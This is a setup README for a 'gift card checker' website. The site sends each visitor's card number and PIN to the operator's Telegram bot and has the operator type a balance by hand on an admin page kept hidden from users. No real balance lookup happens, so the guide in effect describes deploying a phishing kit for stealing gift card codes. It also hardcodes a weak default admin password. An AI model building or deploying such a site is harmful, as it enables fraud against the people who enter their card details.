# GiftCard Checker Website

## Setup Instructions

### 1. Add Your Card Images

The **top carousel** lists **20** cards. Paths and labels live in `config.js` as `CAROUSEL_CARDS`. By default the first five use:

- `razer.png`, `itunes.png`, `stc.png`, `mobily.png`, `lebara.png`

Slots 6–20 use `card6.png` … `card20.png` (see `CAROUSEL_CARDS` for exact `img` paths). You can switch any entry to `.jpg`, `.jpeg`, `.avif`, or `.webp` by changing the `img` string in `config.js` so it matches the real filename.

**Formats:** Modern browsers load **JPEG/JPG**, **PNG**, **WebP**, and **AVIF** from `<img src="...">` as long as the file extension and path are correct—no need to convert unless you want a single format for consistency. Optional: use a `<picture>` element with AVIF + JPEG fallbacks for smaller files on very old browsers.

Recommended size: portrait ratio (e.g. 200×300px) looks best.

---

### 2. Configure Telegram

Edit `config.js` and replace the placeholder values:

```js
TELEGRAM_BOT_TOKEN: 'YOUR_BOT_TOKEN_HERE',   // from @BotFather on Telegram
TELEGRAM_CHAT_ID:   'YOUR_CHAT_ID_HERE',      // your Telegram user/group ID
```

**How to get your Bot Token:**
1. Open Telegram, search @BotFather
2. Send `/newbot` and follow instructions
3. Copy the token it gives you

**How to get your Chat ID:**
1. Search @userinfobot on Telegram
2. Send it `/start` — it replies with your chat ID

---

### 3. Set Admin Password

Open `admin.html` and find this line near the bottom:

```js
const ADMIN_PASSWORD = 'admin1234';
```

Change `admin1234` to any password you want. The public site has **no link** to the admin page—open the admin in the browser by URL only (so users do not see it in the header).

---

### 4. How the System Works

1. **User** enters card number + PIN on the main site → clicks Check Balance
2. **You receive a Telegram message** with the card details and a Request ID
3. **Open the admin URL** in your browser (not linked on the public site) — e.g. `https://your-project.vercel.app/admin` or `https://your-project.vercel.app/admin.html` — and enter your password
4. You'll see the pending request listed with full card details
5. **Enter the balance** (e.g. `SAR 250.00`) and click ✓ Set Balance
6. The user's browser automatically shows the balance (it polls every 3 seconds)

If you click **✗ Invalid**, the user sees an error message instead.

---

### 5. Deploy

**Vercel (this repo is configured for it):**

1. Push this project to GitHub and import the repo in [Vercel](https://vercel.com).
2. **Root directory:** the folder that contains `index.html` (e.g. `giftcard` if your repo is the parent of that folder, or `.` if the repo root is the site).
3. **Build command:** leave empty. **Output:** default static (no framework).
4. After deploy, the site is at `https://<your-project>.vercel.app` and the **admin** is at **`https://<your-project>.vercel.app/admin`** (or `/admin.html`—both work thanks to `vercel.json`).

Other static hosts: Netlify, GitHub Pages, cPanel, etc. Upload the same files; use `/admin.html` if the host does not support path rewrites.

**Note:** `localStorage` is shared only when the **user page and the admin are on the same origin** (e.g. both on `yoursite.vercel.app`). Open admin on the same deployment, not a different domain.

---

### Files Overview

```
vercel.json     — Serves /admin and /admin/ as admin.html (Vercel)
index.html      — Main user-facing page (no admin link in the UI)
admin.html      — Admin panel (password protected)
style.css       — All styles
app.js          — Main logic + Telegram + polling + carousel
config.js       — Telegram credentials + CAROUSEL_CARDS (20 slider entries)
public/
  images/       — Card art (paths in config.js)
```
# gift-checker
